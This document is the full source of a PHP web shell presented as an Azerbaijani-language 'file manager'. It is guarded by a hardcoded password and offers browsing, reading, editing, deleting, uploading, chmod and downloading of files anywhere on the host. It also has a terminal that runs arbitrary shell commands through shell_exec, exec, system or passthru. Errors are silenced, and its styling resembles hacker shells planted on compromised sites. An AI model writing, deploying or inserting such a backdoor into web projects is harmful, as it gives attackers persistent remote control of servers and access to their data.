<?php
error_reporting(0);
@ini_set('display_errors', 0);

// Simple auth
session_start();
$pass = 'admin123'; // Bunu dəyiş

if(!isset($_SESSION['auth'])) {
    if(isset($_POST['pass']) && $_POST['pass'] == $pass) {
        $_SESSION['auth'] = true;
    } else {
        die('<form method=post style="background:#121212;color:#0f0;height:100vh;display:flex;align-items:center;justify-content:center;font-family:monospace"><div><h2>Login</h2><input type=password name=pass style="padding:10px;margin:10px;background:#222;border:1px solid #444;color:#0f0"><br><input type=submit value=Login style="padding:10px 20px;background:#8f0000;color:#fff;border:none;cursor:pointer"></div></form>');
    }
}

if(isset($_GET['logout'])) {
    session_destroy();
    header('Location: '.$_SERVER['PHP_SELF']);
    exit;
}

// Functions
function safe_path($p) {
    return str_replace(['../', '..\\'], '', $p);
}

function get_files($dir) {
    $dir = safe_path($dir);
    if(!is_dir($dir)) return [];
    $items = @scandir($dir);
    $result = [];
    foreach($items as $item) {
        if($item == '.' || $item == '..') continue;
        $path = $dir.'/'.$item;
        $result[] = [
            'name' => $item,
            'path' => $path,
            'type' => is_dir($path) ? 'dir' : 'file',
            'size' => is_file($path) ? @filesize($path) : 0,
            'perms' => @substr(sprintf('%o', @fileperms($path)), -4),
            'modified' => @date('Y-m-d H:i', @filemtime($path))
        ];
    }
    return $result;
}

// Actions
if(isset($_POST['act'])) {
    header('Content-Type: application/json');
    $act = $_POST['act'];
    
    if($act == 'list') {
        echo json_encode(get_files($_POST['dir']));
        exit;
    }
    
    if($act == 'read') {
        $content = @file_get_contents(safe_path($_POST['file']));
        echo json_encode(['ok' => $content !== false, 'data' => $content]);
        exit;
    }
    
    if($act == 'write') {
        $ok = @file_put_contents(safe_path($_POST['file']), $_POST['content']);
        echo json_encode(['ok' => $ok !== false]);
        exit;
    }
    
    if($act == 'delete') {
        $path = safe_path($_POST['file']);
        function del_recursive($p) {
            if(is_file($p)) return @unlink($p);
            if(!is_dir($p)) return false;
            $items = @scandir($p);
            foreach($items as $item) {
                if($item == '.' || $item == '..') continue;
                del_recursive($p.'/'.$item);
            }
            return @rmdir($p);
        }
        $ok = del_recursive($path);
        echo json_encode(['ok' => $ok]);
        exit;
    }
    
    if($act == 'rename') {
        $ok = @rename(safe_path($_POST['old']), safe_path($_POST['new']));
        echo json_encode(['ok' => $ok]);
        exit;
    }
    
    if($act == 'chmod') {
        $ok = @chmod(safe_path($_POST['file']), octdec($_POST['perm']));
        echo json_encode(['ok' => $ok]);
        exit;
    }
    
    if($act == 'newfile') {
        $ok = @touch(safe_path($_POST['dir']).'/'.$_POST['name']);
        echo json_encode(['ok' => $ok]);
        exit;
    }
    
    if($act == 'newdir') {
        $ok = @mkdir(safe_path($_POST['dir']).'/'.$_POST['name'], 0755, true);
        echo json_encode(['ok' => $ok]);
        exit;
    }
    
    if($act == 'upload') {
        $ok = @move_uploaded_file($_FILES['file']['tmp_name'], safe_path($_POST['dir']).'/'.$_FILES['file']['name']);
        echo json_encode(['ok' => $ok]);
        exit;
    }
    
    if($act == 'cmd') {
        $cmd = $_POST['cmd'];
        $out = '';
        
        if(function_exists('shell_exec')) {
            $out = @shell_exec($cmd.' 2>&1');
        } elseif(function_exists('exec')) {
            @exec($cmd.' 2>&1', $tmp);
            $out = implode("\n", $tmp);
        } elseif(function_exists('system')) {
            ob_start();
            @system($cmd.' 2>&1');
            $out = ob_get_clean();
        } elseif(function_exists('passthru')) {
            ob_start();
            @passthru($cmd.' 2>&1');
            $out = ob_get_clean();
        } else {
            $out = 'Command execution disabled';
        }
        
        echo json_encode(['out' => $out ? $out : 'No output']);
        exit;
    }
    
    if($act == 'download') {
        $file = safe_path($_POST['file']);
        if(is_file($file)) {
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="'.basename($file).'"');
            header('Content-Length: '.filesize($file));
            readfile($file);
        }
        exit;
    }
}

$cwd = isset($_GET['dir']) ? safe_path($_GET['dir']) : getcwd();
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Fayl İdarəçisi</title>
<style>
body {
    background-color: #121212;
    font-weight: bold;
    color: #e0e0e0;
    font-family: 'Marhey', sans-serif;
    margin: 0;
    padding: 0;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: flex-start;
    min-height: 100vh;
    box-sizing: border-box;
}

h1 {
    color: #fdd835;
    margin: 20px 0;
    font-size: 2rem;
    text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
}

.r4m1l_background { 
    position: fixed; 
    top: 0; 
    left: 0; 
    right: 0; 
    bottom: 0; 
    width: 100%; 
    height: 100%; 
    border-top-left-radius: 12px; 
    opacity: 0.15; 
    z-index: 1; 
    pointer-events: none; 
}

.r4m1l_background:before { 
    content: ''; 
    position: absolute; 
    top: 0; 
    left: 0; 
    bottom: 0; 
    right: 0; 
    background-image: linear-gradient(to top, transparent, rgba(0,0,0,0.54)); 
    z-index: 0; 
}

.container {
    width: 90%;
    max-width: 1200px;
    z-index: 2;
    position: relative;
}

.path-nav {
    background: #1e1e1e;
    padding: 15px;
    border-radius: 10px;
    margin: 20px 0;
    display: flex;
    justify-content: space-between;
    align-items: center;
    flex-wrap: wrap;
}

.path-nav a {
    color: #64b5f6;
    text-decoration: none;
    margin: 0 5px;
    padding: 5px 10px;
    background: #2a2a2a;
    border-radius: 5px;
}

.path-nav a:hover {
    background: #333;
}

.tabs {
    display: flex;
    gap: 10px;
    margin: 20px 0;
    flex-wrap: wrap;
}

.tab {
    background: #1e1e1e;
    padding: 10px 20px;
    border-radius: 10px;
    cursor: pointer;
    transition: background 0.3s;
}

.tab:hover, .tab.active {
    background: #8f0000;
}

.content {
    display: none;
    background: #1e1e1e;
    padding: 20px;
    border-radius: 10px;
    margin-bottom: 20px;
}

.content.active {
    display: block;
}

ul.file-list {
    list-style: none;
    padding: 0;
    margin: 20px 0;
    width: 100%;
}

ul.file-list li {
    display: flex;
    align-items: center;
    justify-content: space-between;
    background-color: #2a2a2a;
    margin-bottom: 10px;
    padding: 10px;
    border-radius: 10px;
    box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.3);
}

ul.file-list li:hover {
    background-color: #333;
}

ul.file-list li img {
    width: 24px;
    height: 24px;
    margin-right: 10px;
}

ul.file-list li span.file-name {
    flex: 1;
    color: #e0e0e0;
    font-weight: bold;
    cursor: pointer;
}

.file-meta {
    font-size: 11px;
    color: #999;
    margin-top: 3px;
}

.actions {
    display: flex;
    gap: 5px;
    flex-wrap: wrap;
}

.actions button {
    background-color: #8f0000;
    color: #fff;
    border: none;
    padding: 6px 12px;
    border-radius: 5px;
    cursor: pointer;
    font-weight: bold;
    font-size: 11px;
}

.actions button:hover {
    background-color: #980000;
}

.form-actions {
    display: flex;
    flex-direction: column;
    gap: 10px;
    margin-bottom: 20px;
}

.form-actions input[type="text"],
.form-actions textarea {
    width: 100%;
    padding: 10px;
    border: none;
    border-radius: 10px;
    background-color: #2a2a2a;
    color: #e0e0e0;
    font-family: monospace;
}

.form-actions textarea {
    min-height: 300px;
    font-size: 13px;
}

.form-actions button {
    background-color: #8f0000;
    color: #fff;
    border: none;
    padding: 10px 20px;
    border-radius: 10px;
    cursor: pointer;
    font-weight: bold;
}

.form-actions button:hover {
    background-color: #980000;
}

.terminal {
    background: #000;
    color: #0f0;
    padding: 15px;
    border-radius: 10px;
    font-family: 'Courier New', monospace;
    min-height: 400px;
    max-height: 600px;
    overflow-y: auto;
    white-space: pre-wrap;
    word-wrap: break-word;
}

.terminal-input {
    display: flex;
    gap: 10px;
    margin-top: 10px;
}

.terminal-input input {
    flex: 1;
    background: #222;
    border: 1px solid #444;
    padding: 10px;
    color: #0f0;
    font-family: 'Courier New', monospace;
    border-radius: 5px;
}

@media (max-width: 768px) {
    ul.file-list li {
        flex-direction: column;
        align-items: flex-start;
    }

    .actions {
        margin-top: 10px;
        width: 100%;
    }
}
</style>
</head>
<body>

<div class="r4m1l_background" style="background: url(https://i.imgur.com/Us6y1Th.gif) center center / cover no-repeat;"></div>

<div class="container">
    <table>
        <tr>
            <td width="1" align="left">
                <nobr>
                    <a href="?"><br>
                        <img src="https://i.imgur.com/4OIyQQe.png" style="width:98px;height:105px" alt="Logo">
                    </a>
                </nobr>
            </td>
        </tr>
    </table>

    <div class="path-nav">
        <div>
            <strong>Yol:</strong>
            <?php
            $parts = explode('/', $cwd);
            $path = '';
            foreach($parts as $p) {
                if(!$p) continue;
                $path .= '/'.$p;
                echo "<a href='?dir=".urlencode($path)."'>$p</a>";
            }
            ?>
        </div>
        <div>
            <a href="?logout=1" style="background:#8f0000">Logout</a>
        </div>
    </div>

    <div class="tabs">
        <div class="tab active" onclick="showTab('files')">📁 Fayllar</div>
        <div class="tab" onclick="showTab('editor')">📝 Redaktor</div>
        <div class="tab" onclick="showTab('terminal')">💻 Terminal</div>
        <div class="tab" onclick="showTab('upload')">⬆️ Upload</div>
    </div>

    <div id="files" class="content active">
        <div class="form-actions">
            <input type="text" id="newfile" placeholder="Yeni fayl adı">
            <button onclick="newFile()">Fayl Yarat</button>
            <input type="text" id="newdir" placeholder="Yeni qovluq adı">
            <button onclick="newDir()">Qovluq Yarat</button>
        </div>
        <ul class="file-list" id="filelist"></ul>
    </div>

    <div id="editor" class="content">
        <div class="form-actions">
            <input type="text" id="editpath" placeholder="Fayl yolu">
            <button onclick="loadFile()">Yüklə</button>
            <button onclick="saveFile()">Saxla</button>
            <textarea id="editcontent"></textarea>
        </div>
    </div>

    <div id="terminal" class="content">
        <div class="terminal" id="termout">$ Terminal hazırdır. Komanda daxil edin...</div>
        <div class="terminal-input">
            <span style="color:#0f0;padding:8px">$</span>
            <input type="text" id="cmdinput" placeholder="Komanda daxil edin..." onkeypress="if(event.key=='Enter')runCmd()">
            <button onclick="runCmd()" style="background:#8f0000;color:#fff;border:none;padding:10px 20px;border-radius:5px;cursor:pointer">İcra et</button>
        </div>
    </div>

    <div id="upload" class="content">
        <div class="form-actions">
            <input type="file" id="upfile">
            <button onclick="uploadFile()">Yüklə</button>
        </div>
    </div>
</div>

<script>
let dir = '<?php echo addslashes($cwd); ?>';

function req(data, cb) {
    let formData = new URLSearchParams();
    for(let key in data) {
        formData.append(key, data[key]);
    }
    
    fetch('', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: formData
    })
    .then(r => r.json())
    .then(cb)
    .catch(e => console.error('Error:', e));
}

function showTab(id) {
    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.content').forEach(c => c.classList.remove('active'));
    event.target.classList.add('active');
    document.getElementById(id).classList.add('active');
}

function loadList() {
    req({act:'list', dir:dir}, data => {
        let html = '';
        
        if(dir != '/' && dir != '') {
            let up = dir.split('/').slice(0,-1).join('/') || '/';
            html += `<li onclick="changeDir('${up}')">
                <img src="https://img.icons8.com/color/48/000000/folder-invoices.png">
                <span class="file-name">..</span>
            </li>`;
        }
        
        data.forEach(f => {
            let icon = f.type == 'dir' ? 
                'https://img.icons8.com/color/48/000000/folder-invoices.png' : 
                'https://img.icons8.com/color/48/000000/file.png';
            
            let click = f.type == 'dir' ? `changeDir('${f.path}')` : '';
            let acts = f.type == 'file' ? 
                `<button onclick="event.stopPropagation();editIt('${f.path}')">Redaktə</button>
                 <button onclick="event.stopPropagation();download('${f.path}')">Yüklə</button>` : '';
            
            html += `<li ${click ? `onclick="${click}"` : ''}>
                <img src="${icon}">
                <div style="flex:1">
                    <span class="file-name">${f.name}</span>
                    <div class="file-meta">${formatSize(f.size)} | ${f.perms} | ${f.modified}</div>
                </div>
                <div class="actions" onclick="event.stopPropagation()">
                    ${acts}
                    <button onclick="renameIt('${f.path}')">Ad Dəyiş</button>
                    <button onclick="chmodIt('${f.path}')">Chmod</button>
                    <button onclick="deleteIt('${f.path}')">Sil</button>
                </div>
            </li>`;
        });
        
        document.getElementById('filelist').innerHTML = html;
    });
}

function changeDir(d) {
    dir = d;
    location.href = '?dir=' + encodeURIComponent(d);
}

function formatSize(b) {
    if(!b || b == 0) return '0 B';
    let k = 1024, s = ['B','KB','MB','GB','TB'];
    let i = Math.floor(Math.log(b)/Math.log(k));
    return (b/Math.pow(k,i)).toFixed(1) + ' ' + s[i];
}

function deleteIt(f) {
    if(!confirm('Silmək istədiyinizdən əminsiniz?\n' + f)) return;
    req({act:'delete', file:f}, d => {
        alert(d.ok ? 'Uğurla silindi' : 'Xəta baş verdi');
        loadList();
    });
}

function renameIt(f) {
    let n = prompt('Yeni ad:', f);
    if(!n || n == f) return;
    req({act:'rename', old:f, new:n}, d => {
        alert(d.ok ? 'Adı dəyişdirildi' : 'Xəta baş verdi');
        loadList();
    });
}

function chmodIt(f) {
    let p = prompt('Icazələr (məsələn: 0644, 0755):', '0644');
    if(!p) return;
    req({act:'chmod', file:f, perm:p}, d => {
        alert(d.ok ? 'İcazələr dəyişdirildi' : 'Xəta baş verdi');
        loadList();
    });
}

function newFile() {
    let n = document.getElementById('newfile').value.trim();
    if(!n) return alert('Fayl adı daxil edin');
    req({act:'newfile', dir:dir, name:n}, d => {
        alert(d.ok ? 'Fayl yaradıldı' : 'Xəta baş verdi');
        document.getElementById('newfile').value = '';
        loadList();
    });
}

function newDir() {
    let n = document.getElementById('newdir').value.trim();
    if(!n) return alert('Qovluq adı daxil edin');
    req({act:'newdir', dir:dir, name:n}, d => {
        alert(d.ok ? 'Qovluq yaradıldı' : 'Xəta baş verdi');
        document.getElementById('newdir').value = '';
        loadList();
    });
}

function editIt(f) {
    document.getElementById('editpath').value = f;
    document.querySelectorAll('.tab')[1].click();
    loadFile();
}

function loadFile() {
    let f = document.getElementById('editpath').value.trim();
    if(!f) return alert('Fayl yolu daxil edin');
    req({act:'read', file:f}, d => {
        if(d.ok) {
            document.getElementById('editcontent').value = d.data;
        } else {
            alert('Fayl oxuna bilmədi');
        }
    });
}

function saveFile() {
    let f = document.getElementById('editpath').value.trim();
    let c = document.getElementById('editcontent').value;
    if(!f) return alert('Fayl yolu daxil edin');
    req({act:'write', file:f, content:c}, d => {
        alert(d.ok ? 'Fayl saxlanıldı' : 'Xəta baş verdi');
    });
}

function runCmd() {
    let cmd = document.getElementById('cmdinput').value.trim();
    if(!cmd) return;
    
    let out = document.getElementById('termout');
    out.innerHTML += '\n$ ' + cmd + '\n';
    
    req({act:'cmd', cmd:cmd}, d => {
        out.innerHTML += (d.out || 'Heç bir çıxış yoxdur') + '\n';
        out.scrollTop = out.scrollHeight;
    });
    
    document.getElementById('cmdinput').value = '';
}

function uploadFile() {
    let f = document.getElementById('upfile').files[0];
    if(!f) return alert('Fayl seçin');
    
    let fd = new FormData();
    fd.append('act', 'upload');
    fd.append('dir', dir);
    fd.append('file', f);
    
    fetch('', {method:'POST', body:fd})
    .then(r => r.json())
    .then(d => {
        alert(d.ok ? 'Fayl yükləndi' : 'Xəta baş verdi');
        document.getElementById('upfile').value = '';
        loadList();
    });
}

function download(f) {
    let form = document.createElement('form');
    form.method = 'POST';
    form.innerHTML = `<input name="act" value="download"><input name="file" value="${f}">`;
    document.body.appendChild(form);
    form.submit();
    document.body.removeChild(form);
}

// İlk yükləmə
loadList();
</script>
</body>
</html>
